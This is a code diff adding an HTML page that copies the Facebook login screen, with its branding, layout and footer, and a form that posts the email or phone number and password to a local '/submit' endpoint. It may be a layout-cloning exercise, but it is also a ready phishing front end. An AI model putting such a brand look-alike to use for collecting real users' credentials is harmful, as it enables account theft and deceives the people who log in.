@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+
+    .container {
+      display: flex;
+      align-items: center;         
+      justify-content: space-evenly;
+      padding-top: 8%;
+      min-height: 75vh;
+    }
+
+    /* Left section */
+    .header-left h1 {
+      color: #1877f2;
+      font-size: 3rem;
+      margin: 0;
+    }
+
+    .header-left p {
+      font-size: 1.3rem;
+      color: #333;
+    }
+
+    /* Right section */
+    .header-right {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      max-width: 350px;
+      width: 100%;
+    }
+
+    .header-right input {
+      width: 92%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1rem;
+    }
+
+    .header-right button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    .header-right button[type="submit"] {
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+    }
+
+    #connect {
+      background-color: #42b72a;
+      color: white;
+      font-weight: bold;
+    }
+
+    .header-right a {
+      display: block;
+      margin: 10px 0;
+      text-align: center;
+      font-size: 0.9rem;
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    footer {
+      text-align: center;
+      padding: 15px;
+      font-size: 0.9rem;
+      color: #555;
+    }
+
+    footer a {
+      margin: 0 5px;
+      text-decoration: none;
+      color: #1877f2;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="header-left">
+      <h1>Facebook</h1>
+      <section>
+        <p>Connect with friends and the world around you on Facebook.</p>
+      </section>
+    </div>
+
+    <div class="header-right">
+      <form action="/submit" method="post">
+        <input type="text" name="Username" placeholder="Email or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+        <a href="#">Forgot password?</a>
+        <button type="button" id="connect">Create new account</button>
+      </form>
+      <p><b>Create a Page</b> for a celebrity, brand or business.</p>
+    </div>
+  </div>
+
+  <footer>
+    English (US)
+    <a href="www.facebook.com">नेपाली</a>
+    <a href="www.facebook.com">हिन्दी</a>
+    <a href="www.facebook.com">Español</a>
+    <a href="www.facebook.com">Português (Brasil)</a>
+    <a href="www.facebook.com">日本語</a>
+    <a href="www.facebook.com">Français (France)</a>
+    <a href="www.facebook.com">Deutsch</a>
+    <a href="www.facebook.com">Italiano</a>
+    <a href="www.facebook.com">中文(简体)</a>
+  </footer>
+
+</body>
+</html>
